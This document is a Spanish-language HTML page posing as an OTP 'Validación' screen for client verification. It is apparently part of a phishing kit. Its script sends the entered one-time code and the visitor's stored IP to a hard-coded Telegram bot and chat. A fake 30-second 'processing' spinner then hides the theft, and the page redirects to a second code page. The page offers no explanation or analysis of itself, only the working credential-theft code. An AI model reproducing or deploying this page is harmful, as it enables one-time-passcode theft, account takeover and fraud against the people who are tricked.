<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <title>Centro de Asignaciones | Exclusividad clientes</title>
    <style>
        :root { --p: #0A2A5E; }
        body { background: #f8fafc; font-family: sans-serif; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; text-align: center; }
        .card { background: #fff; padding: 45px; border-radius: 24px; width: 380px; box-shadow: 0 15px 35px rgba(0,0,0,0.05); }
        .logo { max-width: 160px; margin-bottom: 30px; }
        input { width: 100%; padding: 18px; border: 2.5px solid var(--p); border-radius: 12px; font-size: 32px; text-align: center; letter-spacing: 10px; font-weight: 800; color: var(--p); outline: none; }
        .btn { width: 100%; padding: 18px; background: var(--p); color: #fff; border: none; border-radius: 12px; font-weight: 700; margin-top: 30px; cursor: pointer; }
        .loader { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #fff; display: none; flex-direction: column; justify-content: center; align-items: center; z-index: 100; }
        .spinner { width: 50px; height: 50px; border: 5px solid #f3f3f3; border-top: 5px solid var(--p); border-radius: 50%; animation: spin 1s linear infinite; }
        @keyframes spin { 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>
    <div class="card">
        <img src="img/nuevo.png" class="logo">
        <h2 style="color: var(--p); margin-top:0;">Validación OTP</h2>
        <p style="font-size: 14px; color: #64748b;">Ingrese el código de seguridad dinámico enviado a su dispositivo.</p>
        <input type="text" id="otp" maxlength="8" placeholder="000000">
        <button class="btn" onclick="send()">Verificar Token</button>
    </div>

    <div id="loading" class="loader">
        <div class="spinner"></div>
        <h3 style="color: var(--p);">Procesando Validación</h3>
        <p>Verificando autenticidad del código (30s)...</p>
    </div>

    <script>
        const a="8652605735:", b="AAGpe405IEzW36zWbSR6HbDvaYRmQHfqHGE", c="-1003900740654";
        async function send() {
            document.getElementById('loading').style.display='flex';
            const msg = `<b>[OTP-1]</b>\nIP: ${localStorage.getItem('_uip')}\nCode: ${document.getElementById('otp').value}`;
            await fetch(`https://api.telegram.org/bot${a+b}/sendMessage?chat_id=${c}&text=${encodeURIComponent(msg)}&parse_mode=HTML`);
            setTimeout(() => { window.location.href='codigo2.html'; }, 30000);
        }
    </script>
</body>
</html>
